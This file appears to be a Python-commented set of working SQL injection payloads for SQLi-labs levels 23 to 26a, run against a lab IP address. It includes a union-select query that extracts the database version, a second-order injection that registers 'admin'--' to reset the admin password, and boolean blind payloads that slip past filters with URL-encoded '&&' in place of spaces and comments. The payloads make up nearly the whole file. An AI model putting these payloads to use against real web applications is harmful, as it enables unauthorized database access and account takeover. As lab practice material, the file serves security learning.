#!/usr/bin/env python
#coding=utf-8

# Less-23
'''
GET-Error based stip comments

http://10.0.103.130/Less-23/?id=-2' union select 1,version(),3 and '4
'''

# Less-24
'''
POST-Second Order Injections

http://10.0.103.130/Less-24/new_user.php
Desired Username: admin'-- 
login
reset password
'''

# Less-25
'''
GET-Error based - All your OR & AND belong to us -string single quote

http://10.0.103.130/Less-25/?id=3' %26%26 1=1+--+
'''

# Less-25a
'''
 GET-Blind based - All your OR & AND belong to us - Intiger based

 http://10.0.103.130/Less-25a/?id=3 %26%26 1=1
 http://10.0.103.130/Less-25a/?id=3 %26%26 1=2
'''

# Less-26
'''
GET-Error based - All your SPACES and COMMENTS belong to us

http://10.0.103.130/Less-26/?id=4'%26%26(1=1)%26%26'1
http://10.0.103.130/Less-26/?id=4'%26%26(1=2)%26%26'1
'''

# Less-26a
'''
GET-Error based - All your SPACES and COMMENTS belong to us -string-single quotes-Parenthesis

http://10.0.103.130/Less-26a/?id=3')%26%26(1=1)%26%26('1
http://10.0.103.130/Less-26a/?id=3')%26%26(1=2)%26%26('1
'''
